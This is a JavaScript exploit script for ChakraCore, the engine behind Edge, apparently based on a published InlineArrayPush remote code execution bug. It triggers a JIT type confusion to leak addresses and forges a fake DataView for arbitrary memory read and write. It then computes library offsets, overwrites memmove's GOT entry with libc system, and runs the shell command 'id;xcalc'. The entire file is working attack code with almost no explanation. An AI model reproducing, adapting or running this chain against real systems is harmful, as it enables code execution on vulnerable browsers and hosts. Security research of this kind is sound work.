//Reference
//https://blogs.projectmoon.pw/2018/08/17/Edge-InlineArrayPush-Remote-Code-Execution/
//http://powerofcommunity.net/poc2017/andrew.pdf


function d_to_i2(c){
    var b=new Uint32Array(new Float64Array([c]).buffer);
    return[b[1],b[0]];
}
 
function i2_to_d(a){
    return new Float64Array(new Uint32Array([a[1],a[0]]).buffer)[0];
}
 
function i2_to_hex(a){
    var c=("00000000"+a[0].toString(16)).substr(-8);
    var b=("00000000"+a[1].toString(16)).substr(-8);
    return[c,b];}
 
function p_i2(a){
    console.log(i2_to_hex(d_to_i2(a))[0]+i2_to_hex(d_to_i2(a))[1]);
    }
 

function hex(a){
    return"0x"+("00000000"+a[0].toString(16)).slice(-8)+("00000000"+a[1].toString(16)).slice(-8)};

var f64 = new Float64Array(1), i32 = new Int32Array(f64.buffer);
var fake_object = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);

var base_lo =0
var base_hi =0

function jit(arr,value,oarr,leak){
    arr[0] = 1.1;
    arr.push(value);
    oarr[2] = leak ;
    f64[0] = arr[2]; // array address if leaked
    base_lo = i32[0], base_hi = i32[1];
    i32[0] = base_lo + 0x58;
    arr[2] = f64[0];
    // (vtable for DataView, IsDetached for ArrayBuffer*)
    fake_object[0] = 0; fake_object[1] = 0;
    // Type*
    fake_object[2] = base_lo + 0x68; fake_object[3] = base_hi;
    // (TypeId for fake Type object, TypeIds_DataView)
    fake_object[4] = 56; fake_object[5] = 0;
    // (JavascriptLibrary* for fake Type object, +0x430 must be valid memory)
    fake_object[6] = base_lo + 0x58 - 0x430; fake_object[7] = base_hi;
    // Buffer size
    fake_object[8] = 0x200; fake_object[9] = 0;
    // ArrayBuffer*, +0x20 IsDetached
    fake_object[10] = base_lo + 0x58 - 0x20; fake_object[11] = base_hi;
    // Buffer address
    fake_object[14] = base_lo + 0x58; fake_object[15] = base_hi;
}


function run(){
    
    let arr = [1.1,2.2,3.3];


    for(let i =0 ; i < 20000;i++){
        arr2 = [2,3,4,5,6,7,8,9];
        delete arr2[1];
        oarr = [1.1,2.2,3.3]
        jit(arr2,3.3,oarr,{});
}
    jit(arr,-5.3049894784e-314,arr,fake_object);
    fake_object_addr = i2_to_d([base_hi,base_lo]);
    print(fake_object_addr);
    console.log("[+] Fake object address : ");
    print(i2_to_hex(d_to_i2(fake_object_addr)));
    dv = arr[2];   
//    print(dv); 
//    print(DataView.prototype.getUint32.call(dv,16,true));
    function read(addr_arr){
        fake_object[14] = addr_arr[0] ; //lo
        fake_object[15] = addr_arr[1] ; //hi
        return [DataView.prototype.getInt32.call(dv, 0, true),DataView.prototype.getInt32.call(dv, 4, true)]; // lo hi
    }
    function write(where,what){
        //where [lo,hi]
        fake_object[14] = where[0] ; //lo
        fake_object[15] = where[1] ; //hi
        DataView.prototype.setInt32.call(dv, 0, what[0] | 0, true); //lo
        DataView.prototype.setInt32.call(dv, 4, what[1] | 0, true); //hi


    }
    // offset for libChakraCore.so from leak is 0xceff50
    sss = read([base_lo,base_hi]);
    chakra_rwx =[];
    chakra_base =[];
    chakra_base[1] = sss[1]; //libChakraCore base hi
    chakra_base[0] = sss[0] - 0xceff50; // lo

    chakra_rwx[1] = chakra_base[1]; //libChakraCore base hi
    chakra_rwx[0] = chakra_base[0] + 0xd2f000; // lo

    //0x7ffff6cc10d0 <memmove@got.plt>:	0x00007ffff60db8b6	0x00007ffff60db8c6
    memmove = [];
    memmove[1] = chakra_rwx[1]; //libChakraCore base hi
    memmove[0] = chakra_rwx[0] + 0xd0; // lo
    //0x7ffff6cc10f0 <free@got.plt>:	0x00007ffff6dcf4f0	0x00007ffff60db906
    free = [];    
    free[1] = chakra_rwx[1]; //libChakraCore base hi
    free[0] = chakra_rwx[0] + 0xf0; // lo


    free_libc = read([free[0] ,free[1]]); //lo,hi
    system_offset = 0x45390 ;
    free_offset = 0x844f0 ;
    system = [free_libc[0]-free_offset+system_offset,free_libc[1]];

    write([memmove[0],memmove[1]],system);

    //crash
    //read([0x41414143,0x41414142]);
    var target = new Uint8Array(100);
    var cmd = "id;xcalc";
    for (var i = 0; i < cmd.length; i++) {
        target[i] = cmd.charCodeAt(i);
    }

    target.copyWithin(0,1)




}

run()
